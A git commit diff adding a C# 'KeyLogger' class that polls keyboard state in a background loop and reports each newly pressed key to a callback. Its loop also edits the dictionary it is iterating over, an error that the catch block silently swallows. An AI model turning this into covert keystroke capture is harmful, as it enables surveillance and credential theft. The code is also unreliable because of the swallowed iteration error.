5782d2d6995c6b04df4aa70722599d1bbd458d62
DenisAstashkin <ast.den27@gmail.com>
2022-07-31 01:40:28 +0400

    Add code for KeyLogger

--- KeyLogger/KeyLogger.cs
+++ KeyLogger/KeyLogger.cs
@@ -1,8 +1,55 @@
 using System;
+using System.Windows.Input;
+using System.Threading.Tasks;
+using System.Collections.Generic;
 
-namespace KeyLogger
+namespace keylogger
 {
-    public class Class1
+    public class KeyLogger
     {
+        public bool start { get; private set; }
+
+        private Dictionary<Key, bool> keys;
+
+        public KeyLogger()
+        {
+            keys = new Dictionary<Key, bool>();
+            for (int i = 1; i < 172; i++)
+            {
+                keys.Add((Key)i, true);
+            }
+            start = false;
+        }
+
+        public void Logger(Action<Key> ShowKeys)
+        {
+            Task.Run(() =>
+            {
+                start = true;
+                try
+                {
+                    while (true)
+                    {
+                        foreach (var item in keys)
+                        {
+                            if (Keyboard.IsKeyDown(item.Key) && item.Value == true)
+                            {
+                                ShowKeys(item.Key);
+                                keys[item.Key] = false;
+                            }
+                            if (Keyboard.IsKeyUp(item.Key))
+                            {
+                                keys[item.Key] = true;
+                            }
+                        }
+                    }
+                }
+                catch (Exception e)
+                {
+                    start = false;
+                    return;
+                }
+            });
+        }
     }
 }
